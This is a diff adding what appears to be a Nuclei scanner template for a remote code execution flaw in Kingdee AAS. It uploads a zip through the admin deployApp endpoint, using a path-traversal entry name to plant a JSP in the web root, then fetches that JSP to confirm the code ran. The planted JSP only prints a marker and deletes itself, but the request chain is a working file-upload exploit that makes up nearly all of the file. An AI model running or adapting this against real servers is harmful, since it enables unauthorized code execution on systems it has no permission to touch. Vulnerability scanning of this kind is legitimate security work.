@@ -1,0 +1,81 @@
+id: kingdee-deployapp-rce
+info:
+  name: 金蝶 deployapp 接口 - 远程代码执行漏洞
+  author: DarkCold
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-855601
+    vendor: kingdee
+    product: aas
+  tags: rce,vuln,kingdee
+variables:
+  s1: '{{to_lower(rand_text_alpha(8))}}'
+  randomFileName: '{{to_lower(rand_text_alpha(8))}}'
+  randomContent: '{{to_lower(rand_text_alpha(8))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+  fname: '{{concat("../../../../deploy/.system/webtool.war/tmpfiles/docroot/res/css/css_", randomFileName, ".jsp")}}'
+  filecontent: '{{concat("<% out.print(\"", randomContent, "\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}'
+  payload: '{{zip(fname, filecontent)}}'
+flow: http(1)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/admin//protect/application/deployApp'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="appName"
+
+      444
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="deployInServer"
+
+      false
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="clientFile"; filename="{{s1}}.zip"
+      Content-Type: application/x-zip-compressed
+
+      {{payload}}
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="archivePath"
+
+
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="baseContext"
+
+
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="startType"
+
+      auto
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="loadon"
+
+
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="virtualHost"
+
+
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="allowHosts"
+
+
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="denyHosts"
+
+
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "monitor") && contains(body, "viewWebXML")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/admin/res/css/css_{{randomFileName}}.jsp'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, randomContent)'
